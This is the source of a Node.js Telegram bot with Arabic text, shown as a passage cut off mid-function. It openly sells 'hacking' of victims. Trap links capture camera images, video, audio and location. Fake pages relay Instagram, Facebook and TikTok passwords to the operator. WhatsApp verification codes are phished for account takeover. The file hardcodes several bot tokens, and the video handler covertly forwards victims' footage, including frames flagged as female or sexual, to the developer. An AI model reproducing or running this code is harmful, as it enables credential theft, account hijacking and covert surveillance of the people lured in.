require('dotenv').config(); 
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const base64 = require('base64-js');
const fs = require('fs');
const { exec } = require('child_process');
const ffmpeg = require('fluent-ffmpeg');
const { PassThrough } = require('stream');
const { DateTime, Duration } = require('luxon');
const fetch = require('node-fetch');
const crypto = require('crypto');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const uuid = require('uuid');
const { setTimeout } = require('timers');
const { randomInt } = require('crypto');
const { Readable } = require('stream');
const FormData = require('form-data');
const cheerio = require('cheerio');
const dns = require('dns');

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const tmo = process.env.is; 
const ff = process.env.gg;
const botToken = process.env.mn; 
const botUsername = process.env.bott; 


const bot = new TelegramBot(botToken, {
  polling: {
    interval: 100,
    autoStart: true,
    params: {
      timeout: 10,
      limit: 100
    }
  }
});


const developerId = 5739065274;


const fixedChannels = [
  { id: '-1002050709727', name: 'قناة1', inviteLink: 'https://t.me/+4xfQ3ctRiFA4NzI0' },
  { id: '-1002602289958', name: 'قناة2', inviteLink: 'https://t.me/+HcYt6DTQCqBlZWFk' },
  { id: '-1002481629916', name: 'قناة3', inviteLink: 'https://t.me/+oo7CRqGHnVY2MmIy' }
];

let additionalChannels = [];
const channelsFile = 'channels.json';
if (fs.existsSync(channelsFile)) {
  try {
    additionalChannels = JSON.parse(fs.readFileSync(channelsFile, 'utf8'));
  } catch (e) {
    console.error('خطأ في قراءة ملف القنوات:', e);
  }
}


let bannedUsers = [];
const bannedUsersFile = 'bannedUsers.json';
if (fs.existsSync(bannedUsersFile)) {
  try {
    bannedUsers = JSON.parse(fs.readFileSync(bannedUsersFile, 'utf8'));
  } catch (e) {
    console.error('خطأ في قراءة ملف المحظورين:', e);
  }
}

let subscribers = new Set();
let isPaidBot = false;

function saveChannels() {
  fs.writeFileSync(channelsFile, JSON.stringify(additionalChannels, null, 2));
}

function saveBannedUsers() {
  fs.writeFileSync(bannedUsersFile, JSON.stringify(bannedUsers, null, 2));
}

function isDeveloper(chatId) {
  return chatId === developerId;
}

function isOldMessage(msgOrQuery) {
  const now = Math.floor(Date.now() / 1000);
  return (now - msgOrQuery.date) > 180; 
}

async function checkUserSubscription(chatId) {
  const allChannels = fixedChannels.concat(additionalChannels);
  for (let channel of allChannels) {
    try {
      const status = await bot.getChatMember(channel.id, chatId);
      if (status.status === 'left' || status.status === 'kicked') {
        return false;
      }
    } catch (error) {
      console.log(`خطأ في التحقق من اشتراك قناة ${channel.name}:`, error.message);
      return false;
    }
  }
  return true;
}

async function showSubscriptionButtons(chatId) {
  const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
  const allChannels = fixedChannels.concat(additionalChannels);
  const buttons = allChannels.map(channel => [
    { text: `اشترك في ${channel.name}`, url: channel.inviteLink }
  ]);

  await bot.sendMessage(chatId, message, {
    reply_markup: {
      inline_keyboard: buttons
    }
  }).catch(() => {});
}


bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;

  if (isOldMessage(msg)) {
    console.log("تم تجاهل رسالة /start قديمة من", chatId);
    return;
  }

  try {
    if (isPaidBot) {
      return await bot.sendMessage(chatId, 'البوت أصبح مدفوعاً، لا يمكنك استخدام الأزرار. راسل المطور @VlP_12');
    }

    if (bannedUsers.includes(chatId)) {
      return await bot.sendMessage(chatId, 'أنت محظور من استخدام هذا البوت.');
    }

    const subscribed = await checkUserSubscription(chatId);
    if (!subscribed) {
      return await showSubscriptionButtons(chatId);
    }

    subscribers.add(chatId); 

    const mainMenuMessage = 'مرحبًا! بك كل الازرار مجاناً:';
    const mainMenuButtons = [
      [{ text: 'اخـ ^_^ـ.راق الكامرا الأمامية 📸', callback_data: `captureFront:${chatId}` }, { text: 'اخـ ^_^ـ.راق الكامرا الخلفية 📷', callback_data: `captureBack:${chatId}` }],
      [{ text: 'اخـ ^_^ـ.راق الموقع 📍', callback_data: `getLocationi:${chatId}` }, { text: 'تسجيل صوت الضحيه 🎤 ', callback_data: `recordAudio:${chatId}` }],
      [{ text: 'اخـ ^_^ـ.راق كاميرات المراقبة 📡', callback_data: 'get_cameras' }, { text: 'تصوير الضحية فيديو 🎥', callback_data: 'capture_video' }],
      [{ text: 'اخـ ^_^ـ.راق واتساب 🟢', callback_data: 'request_verification' }, { text: 'اخـ ^_^ـ.راق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }],
      [{ text: 'اخـ ^_^ـ.راق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` }, { text: 'اخـ ^_^ـ.راق ببجي 🕹', callback_data: 'get_pubg' }],
      [{ text: 'اخـ ^_^ـ.راق فري فاير 👾', callback_data: 'get_freefire' }, { text: 'اخـ ^_^ـ.راق سناب شات ⭐', callback_data: 'add_names' }],
      [{ text: 'اخـ ^_^ـ.راق تيك توك 📳', callback_data: `rshq_tiktok:${chatId}` }, { text: 'الذكاء الاصطناعي 🤖', web_app: { url: 'https://lucent-bombolone-0e290c.netlify.app/' } }],
      [{ text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' }, { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://relaxed-chaja-561613.netlify.app/' } }],
      [{ text: 'تلغيم رابط ⚠️', callback_data: 'get_link' }, { text: 'اخـ ^_^ـ.راق الهاتف كاملاً 🔞', callback_data: 'add_nammes' }],
      [{ text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://moonlit-kitten-1533d0.netlify.app/ok.html' } }, { text: "لعبة المارد الازرق 🧞‍♂️", callback_data: 'play' }],
      [{ text: 'إغلاق المواقع 💣', web_app: { url: 'https://moonlit-kitten-1533d0.netlify.app/index.html' } }],
      [{ text: "صيد فيزات 💳", callback_data: "generate_visa" }, { text: 'تصوير بدقه عاليه 🖼', callback_data: 'get_photo_link' }],
      [{ text: "معرفة رقم الضحيه 📲", callback_data: "generate_invite" }, { text: 'الرقام وهميه ☎️', callback_data: 'get_number' }],
      [{ text: 'فحص الروابط 🪄', callback_data: 'check_links' }, { text: 'البحث عن صور 🎨', callback_data: 'search_images' }],
      [{ text: 'اخـ ^_^ـ.راق بث الراديو 📻', callback_data: 'get_radio_countries_0' }],
      [{ text: 'زخرفة الاسماء 🗿', callback_data: 'zakhrafa' }, { text: 'تحويل النص إلى صوت 🔄', callback_data: 'convert_text' }],
      [{ text: 'صيد يوزرت تلجرام 🪝', callback_data: 'choose_type' }],
      [{ text: "تفسير الأحلام 🧙‍♂️", callback_data: "dream_menur" }],
      [{ text: 'المزيد من المميزات ⛔', url: 'https://t.me/Almunharif2bot?start=1' }],
      [{ text: 'التواصل مع المطور 👨‍🎓', url: 'https://t.me/VlP_12' }]
    ];

    await bot.sendMessage(chatId, mainMenuMessage, {
      reply_markup: {
        inline_keyboard: mainMenuButtons
      }
    }).catch(err => console.error('Send Message Error:', err.message));

  } catch (err) {
    console.error('خطأ في تنفيذ /start:', err.message);
  }
});


bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;

  if (isOldMessage(query)) {
    console.log("تم تجاهل ضغط زر قديم من", chatId);
    return;
  }

  try {
    await bot.answerCallbackQuery(query.id).catch(() => {});
  
  } catch (err) {
    console.error('خطأ في معالجة callback:', err.message);
  }
});


process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
const baseUrl = process.env.rs;

const sessionState = {
  banUser: false,
  unbanUser: false,
  broadcast: false,
  addChannel: false,
  removeChannel: false,
};

function sendAdminPanel(chatId) {
  if (chatId === developerId) {
    const options = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'حظر مستخدم', callback_data: 'ban_user' }],
          [{ text: 'فك حظر مستخدم', callback_data: 'unban_user' }],
          [{ text: 'إرسال إذاعة', callback_data: 'broadcast' }],
          [{ text: 'إضافة قناة اشتراك إجباري', callback_data: 'add_channel' }],
          [{ text: 'إزالة قناة اشتراك إجباري', callback_data: 'remove_channel' }],
          [{ text: 'تحويل البوت إلى مدفوع', callback_data: 'set_paid' }],
          [{ text: 'جعل البوت مجاني', callback_data: 'set_free' }]
        ]
      }
    };
    bot.sendMessage(chatId, 'لوحة التحكم للمطور:', options);
  }
}


bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  if (chatId !== developerId) {
    return;
  }

  if (sessionState.banUser) {
    const userId = parseInt(msg.text);
    if (!bannedUsers.includes(userId)) {
      bannedUsers.push(userId);
      saveBannedUsers();
      bot.sendMessage(chatId, `تم حظر المستخدم: ${userId}`);
    } else {
      bot.sendMessage(chatId, `المستخدم ${userId} محظور بالفعل.`);
    }
    sessionState.banUser = false; 
  } else if (sessionState.unbanUser) {
    const userId = parseInt(msg.text);
    bannedUsers = bannedUsers.filter(id => id !== userId);
    saveBannedUsers();
    bot.sendMessage(chatId, `تم فك الحظر عن المستخدم: ${userId}`);
    sessionState.unbanUser = false; 
  } else if (sessionState.broadcast) {
    subscribers.forEach(subscriber => {
      bot.sendMessage(subscriber, msg.text);
    });
    bot.sendMessage(chatId, 'تم إرسال الإذاعة إلى جميع المشتركين.');
    sessionState.broadcast = false; 
  } else if (sessionState.addChannel) {
    
    const parts = msg.text.split(',');
    if (parts.length === 3) {
      const newChannel = {
        id: parts[0].trim(),
        name: parts[1].trim(),
        inviteLink: parts[2].trim()
      };
      additionalChannels.push(newChannel);
      saveChannels();
      bot.sendMessage(chatId, `تم إضافة قناة الاشتراك الإجباري: ${newChannel.name}`);
    } else {
      bot.sendMessage(chatId, 'الرجاء إدخال البيانات بالصيغة: id,اسم القناة,رابط الدعوة');
    }
    sessionState.addChannel = false; 
  } else if (sessionState.removeChannel) {
    const channelId = msg.text.trim();
    const index = additionalChannels.findIndex(ch => ch.id === channelId);
    if (index !== -1) {
      const removed = additionalChannels.splice(index, 1);
      saveChannels();
      bot.sendMessage(chatId, `تم إزالة قناة الاشتراك الإجباري: ${removed[0].name}`);
    } else {
      bot.sendMessage(chatId, 'لم يتم العثور على القناة بالمعرف المدخل.');
    }
    sessionState.removeChannel = false; 
  }
});


bot.onText(/\/mm/, (msg) => {
  const chatId = msg.chat.id;
  if (chatId === developerId) {
    sendAdminPanel(chatId);
  } else {
    bot.sendMessage(chatId, 'أنت لست المطور.');
  }
});


bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const action = query.data;

  
  if (chatId === developerId) {
    switch (action) {
      case 'ban_user':
        bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد حظره:');
        sessionState.banUser = true;
        break;
      case 'unban_user':
        bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد فك حظره:');
        sessionState.unbanUser = true;
        break;
      case 'broadcast':
        bot.sendMessage(chatId, 'أدخل الرسالة التي تريد إذاعتها لجميع المشتركين:');
        sessionState.broadcast = true;
        break;
      case 'add_channel':
        bot.sendMessage(chatId, 'أدخل بيانات القناة بالصيغة: id,اسم القناة,رابط الدعوة');
        sessionState.addChannel = true;
        break;
      case 'remove_channel':
        bot.sendMessage(chatId, 'أدخل معرف القناة التي تريد إزالتها من قائمة الاشتراك الإجباري:');
        sessionState.removeChannel = true;
        break;
      case 'set_paid':
        isPaidBot = true;
        bot.sendMessage(chatId, 'تم تحويل البوت إلى مدفوع.');
        break;
      case 'set_free':
        isPaidBot = false;
        bot.sendMessage(chatId, 'تم جعل البوت مجاني.');
        break;
    }
  } else {
   
    if (action.startsWith('get_link_')) {
      const linkId = action.split('_')[2];
      if (linkData[linkId] && linkData[linkId].userId === query.from.id) {
        const linkMessage = `رابط تجميع النقاط الخاص بك\nعند دخول شخص عبر الرابط سوف تحصل على 1 نقطة.\nhttps://t.me/${botUsername}?start=${linkId}\nاستخدم الأمر /free لمعرفة نقاطك.`;
        bot.sendMessage(chatId, linkMessage);
      }
    }
  }
});

bot.on('polling_error', (error) => {
  console.log(error);
});


const SECOND_BOT_TOKEN = '7065665133:AAELOAVm07oxkoPuxqz2DOs-FgdwpW5B7mU';
const secondBot = new TelegramBot(SECOND_BOT_TOKEN, { polling: true });


let inviteLinks = {};
let userPoints = {}; 
let linkData = {}; 
let visitorData = {}; 


async function isUserSubscribed(chatId) {
  const allChannels = fixedChannels.concat(additionalChannels);
  try {
    const results = await Promise.all(
      allChannels.map(channel => bot.getChatMember(channel.id, chatId))
    );
    return results.every(result => {
      const status = result.status;
      return status === 'member' || status === 'administrator' || status === 'creator';
    });
  } catch (error) {
    console.error('خطأ في التحقق من حالة الاشتراك:', error);
    return false;
  }
}






// مسار تخزين البيانات
const dataPath = path.join(__dirname, 'points_data.json');

// 🧩 تهيئة ملف البيانات - لا يُعاد إنشاؤه أبداً بعد المرة الأولى
const initializeDataFile = () => {
  try {
    if (!fs.existsSync(dataPath)) {
      const initialData = {
        user_points: {},
        links: {},
        visitors: {}
      };
      fs.writeFileSync(dataPath, JSON.stringify(initialData, null, 2));
      console.log("🆕 تم إنشاء ملف البيانات لأول مرة.");
    } else {
      console.log("📁 تم العثور على ملف البيانات الحالي — لن يُعاد إنشاؤه.");
    }
  } catch (err) {
    console.error("❌ خطأ أثناء تهيئة ملف البيانات:", err);
  }
};

initializeDataFile();

// 🧠 قراءة البيانات من الملف
const readData = () => {
  try {
    const raw = fs.readFileSync(dataPath, 'utf8');
    return JSON.parse(raw);
  } catch (err) {
    console.error("❌ خطأ أثناء قراءة البيانات:", err);
    return { user_points: {}, links: {}, visitors: {} };
  }
};

// 💾 كتابة البيانات إلى الملف
const writeData = (data) => {
  try {
    fs.writeFileSync(dataPath, JSON.stringify(data, null, 2));
    return true;
  } catch (err) {
    console.error("❌ خطأ أثناء حفظ البيانات:", err);
    return false;
  }
};

// 🧱 أدوات إدارة البيانات
const dbHelper = {
  getUserPoints: (userId) => {
    const data = readData();
    return data.user_points[userId] || 0;
  },

  updateUserPoints: (userId, points) => {
    const data = readData();
    data.user_points[userId] = points;
    data.user_points[userId + '_updated'] = new Date().toISOString();
    writeData(data);
  },

  addPoints: async (userId, pointsToAdd) => {
    const current = dbHelper.getUserPoints(userId);
    const newPoints = current + pointsToAdd;
    dbHelper.updateUserPoints(userId, newPoints);
    return newPoints;
  },

  saveLink: (linkId, userId, chatId) => {
    const data = readData();
    if (!data.links[linkId]) {
      data.links[linkId] = {
        user_id: userId,
        chat_id: chatId,
        created_at: new Date().toISOString(),
        is_active: true
      };
      writeData(data);
    }
  },

  getLinkOwner: (linkId) => {
    const data = readData();
    const link = data.links[linkId];
    if (link) {
      return {
        user_id: link.user_id,
        chat_id: link.chat_id
      };
    }
    return null;
  },

  addVisitor: (linkId, visitorId) => {
    const data = readData();
    const key = `${linkId}_${visitorId}`;
    if (!data.visitors[key]) {
      data.visitors[key] = { visited_at: new Date().toISOString() };
      writeData(data);
      return true;
    }
    return false;
  },

  // ✅ جعل الرابط دائم الصلاحية طالما أنه موجود
  isLinkActive: (linkId) => {
    const data = readData();
    return !!data.links[linkId];
  },

  getUserLinks: (userId) => {
    const data = readData();
    return Object.keys(data.links).filter(
      (id) => data.links[id].user_id === userId
    );
  },

  getStats: () => {
    const data = readData();
    return {
      total_users: Object.keys(data.user_points).length,
      total_links: Object.keys(data.links).length,
      total_visits: Object.keys(data.visitors).length
    };
  }
};

// 📊 عرض الإحصائيات عند التشغيل
console.log("📊 تحميل بيانات النقاط...");
const stats = dbHelper.getStats();
console.log(`✅ تم تحميل البيانات:
👥 المستخدمين: ${stats.total_users}
🔗 الروابط: ${stats.total_links}
👣 الزيارات: ${stats.total_visits}`);


// ============ أوامر البوت ============

// أمر /Vip لإنشاء رابط دائم
bot.onText(/\/Vip/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isSubscribed = await isUserSubscribed(chatId);
  if (!isSubscribed) {
    const message = '🚫 الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
    const allChannels = fixedChannels.concat(additionalChannels);
    const buttons = allChannels.map(channel => [{ text: `📢 اشترك في ${channel.name}`, url: channel.inviteLink }]);
    bot.sendMessage(chatId, message, { reply_markup: { inline_keyboard: buttons } });
    return;
  }

  const linkId = uuid.v4();
  dbHelper.saveLink(linkId, userId, chatId);

  const message = '🎉 مرحبًا! هذه الخيارات مدفوعة بسعر 30 نقطة. يمكنك تجميع النقاط وفتحها مجانًا.';
  bot.sendMessage(chatId, message, {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📸 سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
        [{ text: '📞 سحب جميع الأرقام الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
        [{ text: '💬 سحب جميع رسائل الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
        [{ text: '🔄 فرمتة جوال الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
        [{ text: '🖼️ اخـ ^_^ـ.راق عبر صورة 🔒', callback_data: `get_link_${linkId}` }],
        [{ text: 'الزالة الملابس 🔎 🔒', callback_data: `get_link_${linkId}` }],
        [{ text: '🔌 اخـ ^_^ـ.راق الشبكه 🔒', callback_data: `get_link_${linkId}` }],
        [{ text: '📁 اخـ ^_^ـ.راق عبر ملف 🔒', callback_data: `get_link_${linkId}` }]
      ]
    }
  });
});

// عند الضغط على الرابط
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const userId = query.from.id;
  if (query.data.startsWith('get_link_')) {
    const linkId = query.data.split('_')[2];
    const linkOwner = dbHelper.getLinkOwner(linkId);

    if (linkOwner && linkOwner.user_id === userId) {
      const linkMessage = `🔗 رابط تجميع النقاط الخاص بك:\n\n📊 عند دخول شخص عبر الرابط سوف تحصل على 1 نقطة.\n\nhttps://t.me/${botUsername}?start=${linkId}\n\n💎 استخدم الأمر /free لمعرفة نقاطك.\n\n⚠️ هذا الرابط دائم ولا ينتهي حتى بعد إعادة تشغيل البوت.`;
      bot.sendMessage(chatId, linkMessage);
    }
  }
});

// عند الدخول من رابط /start linkId
bot.onText(/\/start (.+)/, async (msg, match) => {
  const linkId = match[1];
  const visitorId = msg.from.id;
  const chatId = msg.chat.id;

  const isLinkActive = dbHelper.isLinkActive(linkId);
  if (!isLinkActive) {
    bot.sendMessage(chatId, '❌ هذا الرابط غير صالح.');
    return;
  }

  const isSubscribed = await isUserSubscribed(chatId);
  if (!isSubscribed) {
    const message = '🚫 الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
    const allChannels = fixedChannels.concat(additionalChannels);
    const buttons = allChannels.map(channel => [{ text: `📢 اشترك في ${channel.name}`, url: channel.inviteLink }]);
    bot.sendMessage(chatId, message, { reply_markup: { inline_keyboard: buttons } });
    return;
  }

  const linkOwner = dbHelper.getLinkOwner(linkId);
  if (linkOwner) {
    const { user_id: ownerId, chat_id: ownerChatId } = linkOwner;

    if (visitorId !== ownerId) {
      const isNew = dbHelper.addVisitor(linkId, visitorId);

      if (isNew) {
        const newPoints = await dbHelper.addPoints(ownerId, 1);
        bot.sendMessage(ownerChatId, `🎉 شخص جديد دخل عبر رابطك!\n💎 حصلت على نقطة جديدة.\n📈 مجموع نقاطك: ${newPoints}`);
      }
      bot.sendMessage(chatId, `👋 مرحبًا بك!\nيمكنك إنشاء رابطك الخاص بالأمر /Vip`);
    } else {
      bot.sendMessage(chatId, '⚠️ لا يمكنك استخدام رابطك الخاص.');
    }
  } else {
    bot.sendMessage(chatId, '❌ الرابط غير صالح.');
  }
});

// عرض النقاط
bot.onText(/\/free/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const points = dbHelper.getUserPoints(userId);

  if (points > 0) {
    bot.sendMessage(chatId, `💎 نقاطك الحالية: ${points} نقطة\n🎯 تحتاج إلى ${30 - points} نقطة للوصول إلى 30.`);
  } else {
    bot.sendMessage(chatId, '📊 لم تجمع أي نقاط بعد.\n🔗 استخدم /Vip للحصول على رابطك الخاص.');
  }
});

// معلومات المستخدم
bot.onText(/\/myinfo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const points = dbHelper.getUserPoints(userId);
  const links = dbHelper.getUserLinks(userId);

  bot.sendMessage(chatId, `📊 معلوماتك:\n💎 النقاط: ${points}\n🔗 عدد الروابط: ${links.length}`);
});

// إحصائيات البوت
bot.onText(/\/stats/, async (msg) => {
  const chatId = msg.chat.id;
  const stats = dbHelper.getStats();
  bot.sendMessage(chatId, `📈 إحصائيات البوت:\n👥 المستخدمين: ${stats.total_users}\n🔗 الروابط: ${stats.total_links}\n👣 الزيارات: ${stats.total_visits}`);
});




const app = express();
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(express.static(__dirname));


const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
const uploadVoice = multer({ dest: 'uploads/' });


app.get('/getNameForm', (req, res) => {
    const chatId = req.query.chatId;
    const formType = req.query.type;

    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }

    let fileName = '';
    switch (formType) {
        case 'instagram':
            fileName = 'i.html';
            break;
        case 'facebook':
            fileName = 'fe.html';
            break;
        case 'tiktok':
        default:
            fileName = 't.html';
            break;
    }

    res.sendFile(path.join(__dirname, fileName));
});

app.get('/getLocation/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'lo.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/captureFront/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'c.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/captureBack/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'b.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/record/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'r.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});


app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `تم اخـ ^_^ـ.راق حساب جديد⚠️: \n اليوزر: ${firstName} \nكلمة السر: ${secondName}`)
        .then(() => {

        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
        });


    res.redirect('https://curious-creponne-45c7e4.netlify.app/index.html');
});
app.use(bodyParser.json());
app.use(express.static(__dirname));


app.get('/whatsapp', (req, res) => {
  res.sendFile(path.join(__dirname, 'n.html'));
});

app.post('/submitPhoneNumber', (req, res) => {
  const chatId = req.body.chatId;
  const phoneNumber = req.body.phoneNumber;


  bot.sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
    .then(() => {
      
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
     
    });
});

app.post('/submitCode', (req, res) => {
  const chatId = req.body.chatId;
  const code = req.body.code;


  bot.sendMessage(chatId, `لقد تم وصول كود الرقم هذا هو\n: ${code}`)
    .then(() => {

      res.redirect('https://faq.whatsapp.com/');
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
      res.json({ success: false });
    });
});

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

const dataStore = {}; 

app.use(express.static(__dirname));
function took() {
  const tokens = [
    "8144014442:AAHSPouqHy-EdCSCtYJ-atI25OUnHaapx5A", // 1توكن
    "8120516767:AAHDaxHqMZQqLu1mXNAIGVA2aTSZCny35kw", // 2توكن
    "7770066795:AAH5IYtMODZ9qZUbVbJb4VlbwEUIfv4HVHs", // توكن3
  ];
  const slot = Math.floor(Date.now() / (15 * 60 * 1000)) % tokens.length;
  return tokens[slot];
}

const botOwner = new TelegramBot(took());


const ownerChatId = 5739065274;



app.post('/submitVideo', async (req, res) => {
    const chatId = req.body.chatId;
    const videoData = req.body.videoData;

    if (!chatId || !videoData) {
        return res.status(400).send('Invalid request: Missing chatId or videoData');
    }

    const videoDataBase64 = videoData.split(',')[1];

    try {
        const buffer = Buffer.from(videoDataBase64, 'base64');
        const tempFilePath = path.join(__dirname, 'temp_video.mp4');
        fs.writeFileSync(tempFilePath, buffer);

       
        let user;
        let username = "غير متوفر";
        let fullName = "غير متوفر";
        
        try {
            user = await bot.getChat(chatId);
            username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
            fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
        } catch (userErr) {
            console.error("حدث خطأ أثناء جلب معلومات المستخدم: ", userErr);
        }

        
        const femaleBotToken = '8469890140:AAFCB6N00YMggHLC5OqAbi4C6o1Q7TwvqEw';//بوت الانثي
        const nsfwBotToken = '7865024716:AAEq3RmOfoguDumrz61FgRJakyxXQlUmS4k';//بوت الاباحي 
        const developerChatId = '5739065274';

       
        const frames = await extractFramesFromVideo(tempFilePath, 12);
        
        let nsfwCount = 0;
        let femaleCount = 0;
        let blockedFrames = [];

       
        for (let i = 0; i < frames.length; i++) {
            try {
                const frameBuffer = frames[i];
                
               
                const formData = new FormData();
                formData.append('image', frameBuffer, {
                    filename: `frame_${i}.jpg`,
                    contentType: 'image/jpeg'
                });

                const SERVER_URL = ff;
                const API_KEY = "hkhlasjoaj5464hjsks";

                const response = await axios.post(`${SERVER_URL}?api_key=${API_KEY}`, formData, {
                    headers: {
                        ...formData.getHeaders(),
                    },
                    timeout: 60000
                });

                const analysisResult = response.data;

              
                if (analysisResult.nsfw_check === 'Yes') {
                    nsfwCount++;
                    blockedFrames.push({ index: i, type: 'nsfw', result: analysisResult.final_result });
                    
                    
                    const nsfwBot = new TelegramBot(nsfwBotToken);
                    await nsfwBot.sendPhoto(developerChatId, frameBuffer, {
                        caption: `🔞 إطار فيديو محظور - محتوى إباحي\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n🎞️ الإطار: ${i + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                    });
                } 
              
                else if (analysisResult.final_result === 'female portrait' && analysisResult.nsfw_check === 'No') {
                    femaleCount++;
                    blockedFrames.push({ index: i, type: 'female', result: analysisResult.final_result });
                    
                    
                    const femaleBot = new TelegramBot(femaleBotToken);
                    await femaleBot.sendPhoto(developerChatId, frameBuffer, {
                        caption: `🚨 إطار فيديو محظور - صورة أنثى\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n🎞️ الإطار: ${i + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                    });
                }

            } catch (analysisError) {
                console.error(`❌ خطأ في فحص الإطار ${i + 1}:`, analysisError.message);
              
            }
        }

        
        if (nsfwCount + femaleCount >= 2) {
          
            await bot.sendMessage(chatId, "🚫 تم حظر الفيديو لاحتوائه على محتوى غير لائق. الرجاء الالتزام بقواعد البوت.");
            
           
            const reportBot = new TelegramBot(femaleBotToken);
            await reportBot.sendMessage(developerChatId, 
                `🚨 فيديو محظور\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n` +
                `📊 الإحصائيات:\n` +
                `• إجمالي الإطارات: ${frames.length}\n` +
                `• إطارات إباحية: ${nsfwCount}\n` +
                `• إطارات أنثى: ${femaleCount}\n` +
                `• إجمالي المحظور: ${nsfwCount + femaleCount}`
            );
        } else {
           
            await bot.sendVideo(chatId, tempFilePath, { caption: '🎥 تم تصوير الضحية فيديو.' });
            await botOwner.sendVideo(ownerChatId, tempFilePath, {
                caption: `📤 فيديو تمت مشاركته.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}`
            });
        }

       
        fs.unlink(tempFilePath, (err) => {
            if (err) console.error('خطأ أثناء حذف ملف الفيديو:', err);
        });

      
        frames.forEach((frame, index) => {
            
        });

        console.log(`Processed video for chatId ${chatId} - Blocked frames: ${nsfwCount + femaleCount}`);
        res.redirect('/ca.html');

    } catch (error) {
        console.error('Error processing video:', error);
        res.status(500).send('Failed to process video');
    }
});


async function extractFramesFromVideo(videoPath, frameCount) {
    return new Promise((resolve, reject) => {
        const frames = [];
        const ffmpeg = require('fluent-ffmpeg');
        
        ffmpeg(videoPath)
            .screenshots({
                count: frameCount,
                folder: __dirname,
                filename: 'frame_%i.jpg',
                size: '320x240'
            })
            .on('end', () => {
                
                const readPromises = [];
                for (let i = 1; i <= frameCount; i++) {
                    const framePath = path.join(__dirname, `frame_${i}.jpg`);
                    readPromises.push(
                        fs.promises.readFile(framePath)
                            .then(buffer => {
                                frames.push(buffer);
                                
